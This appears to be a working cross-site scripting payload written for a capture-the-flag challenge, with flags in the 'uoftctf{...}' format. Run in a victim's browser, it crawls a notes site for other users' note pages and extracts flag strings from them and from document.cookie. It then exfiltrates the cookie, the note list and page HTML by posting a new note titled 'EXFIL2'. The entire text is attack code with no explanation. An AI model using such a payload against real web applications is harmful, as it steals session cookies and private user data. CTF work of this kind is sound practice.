fetch('/').then(r=>r.text()).then(h=>{
  let notes=h.match(/\/note\/[a-f0-9]+/g)||[];
  let unique=[...new Set(notes)];
  let current=location.pathname;
  let others=unique.filter(n=>n!==current);
  let cookie=document.cookie||'NO_COOKIE';
  
  Promise.all(others.map(n=>fetch(n).then(r=>r.text()))).then(pages=>{
    let allText=pages.join('\n');
    let flags=allText.match(/uoftctf\{[^}]+\}/g)||[];
    let cookieFlags=cookie.match(/uoftctf\{[^}]+\}/g)||[];
    let allFlags=[...flags,...cookieFlags];
    
    let result='FLAGS:'+allFlags.join(',')+'\nCOOKIE:'+cookie+'\nNOTES:'+others.join(',')+'\nHTML:'+allText.substring(0,2000);
    
    fetch('/note/new',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'title=EXFIL2&body='+encodeURIComponent(result)
    });
  });
});
